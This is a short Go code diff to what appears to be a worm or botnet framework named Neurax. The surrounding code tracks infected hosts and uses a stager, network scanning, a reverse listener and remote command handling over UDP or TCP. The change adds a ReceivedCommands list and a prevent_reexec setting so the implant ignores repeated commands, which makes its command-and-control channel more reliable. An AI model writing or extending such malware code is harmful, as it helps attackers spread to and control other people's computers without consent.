@@ -24,6 +24,7 @@ import (
 )
 
 var InfectedHosts = []string{}
+var ReceivedCommands = []string{}
 
 type __NeuraxConfig struct {
 	stager           string
@@ -46,6 +47,7 @@ type __NeuraxConfig struct {
 	remove           bool
 	scan_interval    string
 	reverse_listener string
+	prevent_reexec   bool
 }
 
 var NeuraxConfig = __NeuraxConfig{
@@ -69,6 +71,7 @@ var NeuraxConfig = __NeuraxConfig{
 	remove:           false,
 	scan_interval:    "2m",
 	reverse_listener: "none",
+	prevent_reexec:   true,
 }
 
 func ReportError(message string, e error) {
@@ -205,6 +208,12 @@ func NeuraxSignal(addr string) {
 }*/
 
 func handle_command(cmd string) {
+	if NeuraxConfig.prevent_reexec {
+		if coldfire.Contains(ReceivedCommands, cmd) {
+			return
+		}
+		ReceivedCommands = append(ReceivedCommands, cmd)
+	}
 	DataSender := coldfire.SendDataUDP
 	forwarded_preamble := ""
 	if NeuraxConfig.comm_proto == "tcp" {
